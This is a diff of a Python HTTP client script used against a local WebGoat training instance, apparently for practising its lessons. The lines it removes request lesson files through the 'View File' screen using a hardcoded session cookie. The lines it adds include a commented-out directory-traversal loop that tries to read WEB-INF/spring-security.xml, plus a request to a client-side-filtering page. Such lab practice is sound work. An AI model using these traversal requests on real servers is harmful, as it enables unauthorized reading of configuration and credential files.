@@ -28,12 +28,16 @@ class httpclient:
 		self.decorate(req)
 		opener = self.make_opener(uri)
 		self.patch_headers(opener, headers)
+		print(uri)
+		print('<br><br>')
+		
 		return opener.open(req)
 
-	def get(self,uri, data, headers):
+	def get(self,uri, data=dict(), headers=None):
 		url_values = urllib.urlencode(data)
 		uri = uri + '?' + url_values
 		print(uri)
+		print('<br><br>')
 		req = urllib2.Request(uri)
 		self.decorate(req)
 		opener = self.make_opener(uri)
@@ -46,6 +50,9 @@ class httpclient:
 		self.decorate(req)
 		opener = self.make_opener(uri)
 		self.patch_headers(opener, headers)
+		print(uri)
+		print('<br><br>')
+		
 		return opener.open(req)
 
 	def patch_headers(self, opener,headers):
@@ -66,13 +73,12 @@ class httpclient:
 		return Cookie(None, name, value, None, False, domain, False, False, '/', True, False, '1370002304', False, 'TestCookie', None, None, False)
 
 cat = httpclient()
-cat.cookies.set_cookie(cat.make_cookie('JSESSIONID','A8A9EB6C28315BAE0E381B82CD81D894'))
-
-
-tries = ['AccessControlMatrix.html','BackDoors.html','BasicAuthentication.html','BlindStringSqlInjection.html','ChallengeScreen.html','ClientSideFiltering.html','ClientSideValidation.html','CommandInjection.html','ConcurrencyCart.html','CrossSiteScripting.html','CSRF.html','CsrfPromptByPass.html','CsrfTokenByPass.html','DangerousEval.html','DBCrossSiteScripting.html','DBSQLInjection.html','DOMInjection.html','DOMXSS.html','DOS_Login.html','Encoding.html','FailOpenAuthentication.html']
-
-for x in tries:
-  data = cat.get('http://localhost:8080/WebGoat/attack', {'Screen':308, 'menu':200, 'File':x, 'SUBMIT': 'View+File'}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
-  print(data.read())
-
+#cat.cookies.set_cookie(cat.make_cookie('JSESSIONID','A8A9EB6C28315BAE0E381B82CD81D894'))
+#t = '../'
+#for x in range(0, 10):
+	#t = t + '../'
+	#data = cat.get('http://localhost:8080/WebGoat/attack', {'Screen':308, 'menu':200, 'File': t + 'WebGoat\\WEB-INF/spring-security.xml', 'SUBMIT': 'View+File'}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
+	#print(data.read())
+	
+data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
 print(data.read())
